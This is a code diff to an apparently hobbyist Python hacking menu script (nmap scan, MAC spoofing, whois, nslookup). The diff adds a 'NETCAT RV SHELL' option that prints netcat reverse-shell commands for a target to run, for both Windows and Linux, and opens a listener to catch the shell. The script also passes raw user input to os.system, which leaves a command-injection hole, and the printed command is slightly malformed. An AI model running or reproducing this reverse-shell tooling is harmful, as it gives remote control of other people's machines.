@@ -19,7 +19,7 @@ quotes = [
     "Knowledge is free. We are anonymous. We are Legion.",
     "Expect the unexpected.",
     "There is no patch for human stupidity.",
-    "Muffin and Yuka rule the world.",
+    "Muffin and yuka rule the world.",
     "Keep calm and hack ethically."
 ]
 
@@ -52,7 +52,8 @@ option = input("""1.NMAP PORT SCAN
          4.MAC SPOOFING
          5.WHOIS INFO
          6.NSLOOKUP
-         7.EXIT NEVER
+         7.NETCAT RV SHELL
+         8.EXIT NEVER
          """)
 
 if option == "1":
@@ -76,4 +77,9 @@ elif option == "6":
     target_ip = input("What is the domain you want to lookup? ")
     os.system("nslookup " + target_ip)
 elif option == "7":
+    print("TARGET HAS TO HAVE NETCAT INSTALLED!!")
+    lport = input("What port do you want the target to connect on? (recommended a not in use one)")
+    print("TARGET HAS TO RUN THIS COMMAND: Windows = cmd.exe /c nc.exe <your ip>"  + lport +  "-e cmd.exe linux = nc -e /bin/bash <your ip> " + lport)
+    os.system("nc -lnvp " + lport)
+elif option == "8":
     exit()
